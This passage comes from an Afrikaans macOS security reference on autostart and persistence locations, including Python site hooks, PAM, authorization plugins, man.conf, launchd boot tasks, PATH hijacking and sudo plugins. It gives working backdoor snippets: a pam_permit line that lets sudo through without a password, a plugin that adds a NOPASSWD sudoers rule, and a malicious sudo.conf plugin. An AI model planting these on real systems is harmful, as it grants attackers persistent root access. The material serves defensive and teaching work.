Uiteensetting: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Word uitgevoer wanneer die betrokke Python-interpreter met daardie site-gids geaktiveer begin; die sneller is nie universeel oor virtuele omgewings, Python-bouweergawes of opstartvlae heen nie
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)
  - Word uitgevoer met die voorregte/TCC van die proses wat die interpreter begin het

#### Ligging

- **`$(python3 -m site --user-site)/*.pth`** (macOS-raamwerkbouweergawes: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Geen root nodig nie (skryfbaar deur die gebruiker)
  - **Sneller**: opstart van daardie Python-bouweergawe met sy user site geaktiveer; die `site`-module verwerk `.pth`-lêers in aktiewe site-gidse
- **`<user-site>/usercustomize.py`**
  - Geen root nodig nie
  - **Sneller**: opstart met die user site geaktiveer (outomaties deur `site` ingevoer)
- **`<prefix>/site-packages/sitecustomize.py`** (bv. `/opt/homebrew/lib/python3.13/site-packages/`, of stelselroetes)
  - Root/admin kan nodig wees, afhangend van die interpreter se ligging
  - **Sneller**: opstart van ’n interpreter wat daardie site-gids insluit

#### Beskrywing & Uitbuiting

By opstart voer Python gewoonlik `site` in en skandeer sy aktiewe `site-packages`-gidse vir `.pth`-lêers. Benewens die byvoeging van roetes, voer ’n `.pth`-reël wat met `import ` begin Python-kode uit, selfs al word die genoemde module nooit andersins gebruik nie. Python probeer ook om `sitecustomize` in te voer en, **wanneer die user site geaktiveer is**, `usercustomize`.<sup>[[56]](#references)</sup> Die sneller is ’n latere opstart van ’n interpreter wat die gewysigde gids sien. `-S` deaktiveer `site`-verwerking; `-s`, `-I` of `PYTHONNOUSERSITE` deaktiveer die **user-site**-variante. `-I` deaktiveer oor die algemeen nie ’n globale `sitecustomize` nie. Virtuele omgewings kan ook die user site uitsluit. Gaan `python3 -m site` na vir die spesifieke interpreter.

Die volgende PoC is op macOS 26.5.2 uitgevoer. `PYTHONUSERBASE` skuif die user site na ’n tydelike gids vir hierdie toets; geen werklike user site word gewysig nie:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Albei merkers het verskyn. Deur die toets met `-s`, `-I` of `-S` te herhaal, is albei **user-site**-merkers verhoed. `sitecustomize` in ’n globale werf-gids is nie getoets nie.

## Root Sandbox Bypass

> [!TIP]
> Hier kan jy beginliggings vind wat nuttig is vir **sandbox bypass** en jou toelaat om iets eenvoudig uit te voer deur dit **in ’n lêer te skryf**, met **root** te wees en/of ander **vreemde toestande** te vereis.

### Periodic

> [!CAUTION]
> **Historiese meganisme:** Op die macOS 26.5.2-toetsmasjien ontbreek `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` en die `com.apple.periodic-*`-launch daemons. Moenie aanvaar dat die skep van `/etc/periodic` op ’n huidige stelsel die inhoud daarvan sal skeduleer nie. Gaan na of beide die opdrag en ’n geaktiveerde skeduleerder in die teikenweergawe teenwoordig is voordat jy die voorbeeld hieronder gebruik.

Beskrywing: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root word vereis
  - **Sneller**: Wanneer die tyd aanbreek
- `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local`
  - Root word vereis
  - **Sneller**: Wanneer die tyd aanbreek

#### Beskrywing & Uitbuiting

Op ouer weergawes is die periodic-skripte (**`/etc/periodic`**) deur **launch daemons** in `/System/Library/LaunchDaemons/com.apple.periodic*` geskeduleer. Vanaf macOS Big Sur 11.5 het die periodic runner skripte in die periodic-gidse uitgevoer as die **eienaar van elke lêer**, wat ’n vorige privilege-escalation-pad afgesluit het.<sup>[[27]](#references)</sup> Die opdragte en gidslysinskrywings hieronder is historiese uitvoer, nie ’n toetsresultaat van macOS 26.5.2 nie.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Daar is ander periodieke skripte wat uitgevoer sal word, soos aangedui in **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Op ouer stelsels waar `periodic` en sy launch daemons geïnstalleer en geaktiveer is, was `/etc/daily.local`, `/etc/weekly.local` en `/etc/monthly.local` bykomende uitvoeringspaaie. ’n Onskadelike, leesalleen-kontrole is:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Die reël gebaseer op eienaarskap is op scripts direk in die periodieke gidse toegepas. Die historiese `999.local`-omhulsel het vroeër `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local` ingesluit sonder dieselfde eienaarskapkontrole; wanneer die skeduleerder as root geloop het, is hierdie plaaslike lêers as root uitgevoer. Hierdie onderskeid en die verandering in Big Sur 11.5 word in die [oorspronklike navorsing](https://theevilbit.github.io/beyond/beyond_0019/) gedokumenteer. Geen van hierdie paaie moet as aktief beskou word wanneer `periodic` ontbreek nie.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Root word altyd vereis

#### Beskrywing & Uitbuiting

Aangesien PAM meer op **persistence** en malware gefokus is as op maklike uitvoering binne macOS, sal hierdie blog nie ’n gedetailleerde verduideliking gee nie; **lees die writeups om hierdie tegniek beter te verstaan**.<sup>[[28]](#references)</sup>

Kontroleer PAM-modules met:

```bash
ls -l /etc/pam.d
```

’n Volhardings-/voorregte-eskalasietegniek wat PAM misbruik, is so eenvoudig soos om die module /etc/pam.d/sudo te wysig en die volgende reël heel bo by te voeg:

```bash
auth       sufficient     pam_permit.so
```

Dit sal dus **lyk soos** iets soos hierdie:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

En daarom sal enige poging om **`sudo` te gebruik werk**.

> [!CAUTION]
> Let daarop dat hierdie gids deur TCC beskerm word, so dit is hoogs waarskynlik dat die gebruiker ’n versoek sal kry om toegang te verleen.

Nog ’n goeie voorbeeld is su, waar jy kan sien dat dit ook moontlik is om parameters aan die PAM modules te gee (en jy kan ook hierdie lêer backdoor):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Magtigingsinproppe

Skrywe: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Skrywe: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees en ekstra konfigurasies maak
- TCC-omseiling: ???

#### Ligging

- `/Library/Security/SecurityAgentPlugins/`
  - Root word vereis
  - Dit is ook nodig om die magtigingsdatabasis op te stel om die inprop te gebruik

#### Beskrywing & Uitbuiting

Jy kan ’n magtigingsinprop skep wat uitgevoer word wanneer ’n gebruiker aanmeld, om volharding te handhaaf. Vir meer inligting oor hoe om een van hierdie inproppe te skep, kyk na die vorige skrywes (en wees versigtig: ’n swak geskryfde inprop kan jou uitsluit, waarna jy jou Mac vanuit herstelmodus sal moet skoonmaak).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Skuif** die bundel na die ligging waar dit gelaai moet word:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Voeg laastens die **reël** by om hierdie Plugin te laai:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

Die **`evaluate-mechanisms`** sal die magtigingsraamwerk laat weet dat dit **’n eksterne meganisme vir magtiging sal moet aanroep**. Boonop sal **`privileged`** veroorsaak dat dit as root uitgevoer word.

Aktiveer dit met:

```bash
security authorize com.asdf.asdf
```

En dan behoort die **staff-groep sudo**-toegang te hê (lees `/etc/sudoers` om dit te bevestig).

### Man.conf

Skrywe: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees en die gebruiker moet man gebruik
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/private/etc/man.conf`**
  - Root word vereis
  - **`/private/etc/man.conf`**: Wanneer man gebruik word

#### Beskrywing & uitbuiting

Die konfigurasielêer **`/private/etc/man.conf`** dui die binary/script aan wat gebruik moet word wanneer man-dokumentasielêers oopgemaak word. Die pad na die uitvoerbare lêer kan dus verander word sodat ’n backdoor uitgevoer word wanneer die gebruiker man gebruik om dokumentasie te lees.<sup>[[31]](#references)</sup>

Stel byvoorbeeld in **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

En skep dan `/tmp/view` as:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees en apache moet loop
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd het nie entitlements nie

#### Ligging

- **`/etc/apache2/httpd.conf`**
  - Root word vereis
  - Sneller: Wanneer Apache2 begin word

#### Beskrywing & Uitbuiting

Jy kan in `/etc/apache2/httpd.conf` aandui dat ’n module gelaai moet word deur ’n reël soos die volgende by te voeg:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Op hierdie manier sal jou saamgestelde module deur Apache gelaai word. Die enigste ding is dat jy dit óf met ’n geldige Apple-sertifikaat moet **onderteken**, óf ’n nuwe vertroude sertifikaat by die stelsel moet **voeg** en dit daarmee moet **onderteken**.

Dan kan jy, indien nodig, die volgende uitvoer om seker te maak dat die bediener begin word:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Kodevoorbeeld vir die Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM-ouditraamwerk

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees, auditd moet loop en ’n waarskuwing veroorsaak
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/etc/security/audit_warn`**
  - Root word vereis
  - **Sneller**: Wanneer auditd ’n waarskuwing opspoor

#### Beskrywing en uitbuiting

Wanneer auditd ’n waarskuwing opspoor, word die script **`/etc/security/audit_warn`** **uitgevoer**. Jy kan dus jou payload daarin byvoeg.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Jy kan ’n waarskuwing afdwing met `sudo audit -n`.

### Opstartitems

> [!CAUTION] > **Dit is verouderd, dus behoort daar niks in daardie gidse gevind te word nie.**

Die **StartupItem** is ’n gids wat binne óf `/Library/StartupItems/` óf `/System/Library/StartupItems/` moet wees. Sodra hierdie gids geskep is, moet dit twee spesifieke lêers bevat:

1. ’n **rc script**: ’n Shell script wat tydens opstart uitgevoer word.
2. ’n **plist file**, spesifiek genaamd `StartupParameters.plist`, wat verskeie konfigurasie-instellings bevat.

Maak seker dat beide die rc script en die `StartupParameters.plist`-lêer korrek binne die **StartupItem**-gids geplaas is, sodat die opstartproses dit kan herken en gebruik.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ek kan nie hierdie komponent in my macOS vind nie, so kyk na die writeup vir meer inligting.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

**emond**, wat deur Apple bekendgestel is, is ’n logging-meganisme wat onderontwikkel of moontlik laat vaar blyk te wees, maar steeds toeganklik is. Alhoewel dit nie besonder nuttig vir ’n Mac-administrateur is nie, kan hierdie obskure diens as ’n subtiele persistence-metode vir threat actors dien, en waarskynlik deur die meeste macOS-admins onopgemerk bly.<sup>[[34]](#references)</sup>

Vir diegene wat weet dat dit bestaan, is dit eenvoudig om enige kwaadwillige gebruik van **emond** te identifiseer. Die stelsel se LaunchDaemon vir hierdie diens soek na scripts om in ’n enkele directory uit te voer. Die volgende command kan gebruik word om dit te inspekteer:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Ligging

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root word vereis
  - **Sneller**: Met XQuartz

#### Beskrywing & Uitbuiting

XQuartz word **nie meer op macOS geïnstalleer nie**, so kyk na die writeup as jy meer inligting wil hê.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Die installering van ’n kext is so ingewikkeld, selfs as root, dat dit nie as ’n praktiese sandbox-ontsnappings- of volhardingstegniek beskou word nie, tensy jy ’n exploit het.

#### Ligging

Om ’n KEXT as ’n opstartitem te installeer, moet dit **op een van die volgende liggings geïnstalleer word**:

- `/System/Library/Extensions`
  - KEXT-lêers wat in die OS X-bedryfstelsel ingebou is.
- `/Library/Extensions`
  - KEXT-lêers wat deur derdeparty-sagteware geïnstalleer is

Jy kan tans gelaaide kext-lêers lys met:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Vir meer inligting oor [**kernel extensions, raadpleeg hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Ligging

- **`/usr/local/bin/amstoold`**
  - Root word vereis

#### Beskrywing & uitbuiting

Blykbaar het die `plist` van `/System/Library/LaunchAgents/com.apple.amstoold.plist` hierdie binary gebruik terwyl dit 'n XPC-diens blootgestel het... die ding is dat die binary nie bestaan het nie, so jy kon iets daar plaas en wanneer die XPC-diens opgeroep word, sou jou binary opgeroep word.<sup>[[35]](#references)</sup>

Ek kan dit nie meer in my macOS vind nie.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Ligging

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root word vereis
  - **Sneller**: Wanneer die diens uitgevoer word (selde)

#### Beskrywing & uitbuiting

Blykbaar is dit nie baie algemeen om hierdie script uit te voer nie, en ek kon dit nie eers in my macOS vind nie. Raadpleeg dus die writeup as jy meer inligting wil hê.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Dit werk nie in moderne MacOS-weergawes nie**

Dit is ook moontlik om **opdragte wat tydens opstart uitgevoer sal word** hier te plaas. Voorbeeld van 'n gewone rc.common-script:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd-opstarttake

Uiteensetting: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle) (vereis root)
- Root word vereis, plus óf ’n **SIP-omseiling** óf die **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access-toestemming, afhangend van die pad

#### Ligging

`launchd` bevat ’n plist in sy **`__TEXT,__config`**-afdeling wat vroeë “opstarttake” beskryf. Verskeie verwysingskripte/-binêre lêers wat **nie** by verstek bestaan nie, kan deur ’n aanvaller geskep word:

- SIP-omseilingstel: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA-stel: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` bestaan vooraf slegs op Sequoia+)

#### Beskrywing & Uitbuiting

Stort die ingebedde taakstabel om te sien watter lêers `launchd` sal uitvoer en watter sleutels ondersteun word (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Die skep van een van die lêers waarna verwys word (bv. `/etc/rc.server`) laat `launchd` dit tydens die volgende (userspace-)herlaai uitvoer. Die nuttigste inskrywings word deur SIP geblokkeer of vereis TCC SysAdminFiles/Full Disk Access, dus is dit ’n tegniek op root-vlak wat deur ’n herlaai geaktiveer word.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Skrywe: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Die `rc.trampoline`-selflaaitaak voer tydens selflaai ’n **platform-binary (deur Apple onderteken)** uit wat in die `apple-trusted-trampoline` NVRAM-veranderlike gestoor is, maar **slegs wanneer die `rc.trampoline=1`-selflaaiargument gestel is en SIP gedeaktiveer is** (met ’n grootteperk van ongeveer 390&nbsp;KB en ’n beperking wat vereis dat dit vinnig blokkeer of terugkeer). Omdat dit **root + gedeaktiveerde SIP + ’n payload wat deur Apple onderteken is** vereis, is dit in die praktyk onbruikbaar vir volharding in die werklike wêreld en word dit net vir volledigheid hier gelys.<sup>[[41]](#references)</sup>

### /etc/paths en /etc/paths.d (PATH hijack)

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle) (root nodig om te skryf)
- Root word vereis

#### Ligging

- **`/etc/paths`** en **`/etc/paths.d/*`** — word deur **`path_helper`** gelees (opgeroep vanuit `/etc/zprofile`) om die verstek-`PATH` by aanmelding saam te stel.

#### Beskrywing en uitbuiting

Albei behoort aan root. Deur ’n gids wat deur ’n aanvaller beheer word vooraan te plaas (deur `/etc/paths` te wysig of ’n lêer in `/etc/paths.d/` te plaas), verskyn daardie gids vroeg in elke nuwe aanmeldingshell se `PATH`. ’n Kwaadwillige binary met die naam van ’n algemene opdrag (`ls`, `git`, …) **skadu** dus die regte een en loop die volgende keer wanneer die slagoffer dit aanroep.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Skrywe: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Nuttig vir sandbox-bypass: [🔴](https://emojipedia.org/large-red-circle) (root benodig)
- Root benodig; resultaat **bypasses SIP**. Geaffekteerde macOS **15.0–15.1**, reggestel in **15.2**

#### Ligging

- Plaas ’n filesystem bundle in **`/Library/Filesystems/`**.

#### Beskrywing & Exploitation

`storagekitd` het die entitlement **`com.apple.rootless.install.heritable`** en het die binaries van filesystem bundles met daardie SIP-bypass-vermoë **geërf** laat loop. Deur ’n kwaadwillige filesystem bundle te plaas, kon ’n aanvaller code met ’n SIP-bypass laat loop om **volgehoue kernel extensions** te installeer of na SIP-beskermde `LaunchDaemon`-gidse te skryf — persistence wat normale beskerming oorleef en omseil.<sup>[[46]](#references)</sup> Apple het dit in macOS Sequoia 15.2 reggestel.

### sudo plugins (/etc/sudo.conf)

Skrywe: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Nuttig vir sandbox-bypass: [🔴](https://emojipedia.org/large-red-circle) (root benodig om na `/etc/sudo.conf` te skryf)
- Root benodig om te installeer; die plugin loop daarna binne **elke `sudo`-aanroep** (setuid-root-konteks)

#### Ligging

- **`/etc/sudo.conf`** — `Plugin`-reëls laai gedeelde objekte vanaf **`/usr/libexec/sudo/`** (of ’n absolute pad). By verstek afwesig (sudo gebruik ’n ingeboude beleid), dus is die skep daarvan ’n skoon hook.

#### Beskrywing & Exploitation

`sudo` laai sy beleid-/goedkeurings-/ouditplugins vanaf `/etc/sudo.conf`. Omdat `sudo` setuid-root is, voer ’n kwaadwillige shared-object-plugin met **root-regte uit elke keer wanneer enige gebruiker `sudo` laat loop** — duursame root-persistence wat ook elke sudo-opdrag sien.<sup>[[51]](#references)</sup> macOS word met sudo 1.9.x gelewer, wat die plugin-API ondersteun.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL-inproppe

Skrywe: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimale voorbeeld: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Verouderde meganisme:** Afgekeur sedert macOS 12.3. macOS 14.1 en later deaktiveer verouderde video-inproppe by verstek. ’n Gebruiker moet verouderde video-ondersteuning vanuit Recovery herstel voordat hierdie metode kan werk; ’n skryfbare gids alleen is nie voldoende nie. [Apple se huidige ondersteuningsriglyne](https://support.apple.com/en-us/108387).
- Root-toegang word benodig om na die inprop-gids te skryf. Enige kode-uitvoering hang af van ’n versoenbare kliënt wat steeds DAL-inproppe laai; dit is nie tydens looptyd op macOS 26 getoets nie.

#### Ligging

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Root-toegang benodig
  - **Sneller:** ’n Versoenbare kamerakliënt lys toestelle **nadat verouderde ondersteuning herstel is**. Kliëntbiblioteek-validering kan ’n derdeparty-inprop blokkeer.

#### Beskrywing en uitbuiting

CoreMediaIO **DAL**-inproppe (Device Abstraction Layer) is deur sommige kameratoepassings binne die proses gelaai. Apple se [aanbieding oor kamera-uitbreidings](https://developer.apple.com/videos/play/wwdc2022/10022/) sê uitdruklik dat verouderde DAL-inproppe **nie** met FaceTime, QuickTime Player of Photo Booth gewerk het nie, en dat baie ander kliënte biblioteekvalidering toepas. Moderne [Core Media I/O-uitbreidings](https://developer.apple.com/documentation/coremediaio) loop buite die proses, met ’n aparte installasie- en goedkeuringsmodel. Die historiese tegniek binne die proses impliseer nie ’n algemene Camera TCC-omseiling op huidige macOS nie.<sup>[[53]](#references)[[54]](#references)</sup>

Leesalleen-waarneming op macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` bestaan en is root-besit. Nóg verouderde ondersteuning nóg laaiing deur enige kliënt is geverifieer.

### Directory Service-inproppe

